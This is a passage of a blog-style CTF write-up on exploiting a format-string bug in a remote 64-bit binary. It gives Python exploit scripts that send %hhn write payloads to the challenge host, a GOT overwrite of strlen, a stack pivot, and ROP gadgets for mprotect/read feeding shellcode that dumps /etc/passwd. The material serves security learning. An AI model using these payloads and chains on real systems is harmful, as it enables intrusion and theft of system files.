</span><span class='line'><span class="n">strlen_addr</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] strlen is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">strlen_addr</span><span class="p">))</span>
</span><span class='line'><span class="c"># from libc-2.13-38 -- NOT CORRECT</span>
</span><span class='line'><span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_addr</span> <span class="o">-</span> <span class="mh">0x80b70</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] libc_base is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to have three addresses on the stack which we can directly address</span>
</span><span class='line'><span class="c"># to use them in the format string vuln </span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e21</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601e22</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ok, now try to set three bytes in one go</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># should write out &quot;BAS&quot; in one go</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="si">%66c</span><span class="s">%{}$hhn</span><span class="si">%255c</span><span class="s">%{}$hhn</span><span class="si">%18c</span><span class="s">%{}$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">637</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">638</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read it back to check!</span>
</span><span class='line'><span class="n">check</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601e20</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">check</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%{}$hhn</span><span class="si">%255c</span><span class="s">%{}$hhn</span><span class="si">%18c</span><span class="s">%{}$hhn</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">637</span><span class="p">,</span> <span class="n">format_offset</span><span class="o">+</span><span class="mi">638</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sploit7.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f01
</span><span class='line'>scratch contains:  0x601b
</span><span class='line'>scratch is parameter 1601
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> strlen is at 0x7f82b7326c40.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc_base is at 0x7f82b72a60d0.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e20 to 1601
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e21 to 1602
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601e22 to 1603
</span><span class='line'>
</span><span class='line'>0x534142
</span></code></pre></td></tr></table></div></figure>


<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">strncpy</span><span class="p">(</span><span class="n">cleanBuffer</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="c1">// dissambled:</span>
</span><span class='line'><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x11f0</span><span class="p">]</span>
</span><span class='line'><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>      <span class="c1">// rax and rdi now point to buf</span>
</span><span class='line'><span class="n">call</span> <span class="n">dword</span> <span class="mh">0x400b00</span> <span class="c1">// strlen</span>
</span></code></pre></td></tr></table></div></figure>


<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">stack</span> <span class="n">lifting</span>
</span><span class='line'><span class="n">syscall</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rax</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdi</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rsi</span>
</span><span class='line'><span class="n">pop</span> <span class="n">rdx</span>
</span></code></pre></td></tr></table></div></figure>


<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x041cf9</span><span class="o">:</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x0002028a</span> <span class="o">:</span> <span class="n">pop</span> <span class="n">r15</span><span class="p">;</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x0006933f</span> <span class="o">:</span> <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="n">r15</span><span class="p">];</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r13</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r14</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r15</span><span class="p">;</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x000eb938</span> <span class="o">:</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">];</span> <span class="n">ret</span>
</span><span class='line'><span class="mh">0x0002c10e</span> <span class="o">:</span> <span class="n">xchg</span> <span class="n">eax</span><span class="p">,</span> <span class="n">edi</span><span class="p">;</span> <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read_from_address</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>       <span class="c"># change address</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>     <span class="c"># write byte</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dump1</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">dump1</span>
</span><span class='line'>
</span><span class='line'><span class="c"># write a value to a string format parameter</span>
</span><span class='line'><span class="k">def</span> <span class="nf">write_on_stack</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># write out all the bytes of what</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">what</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
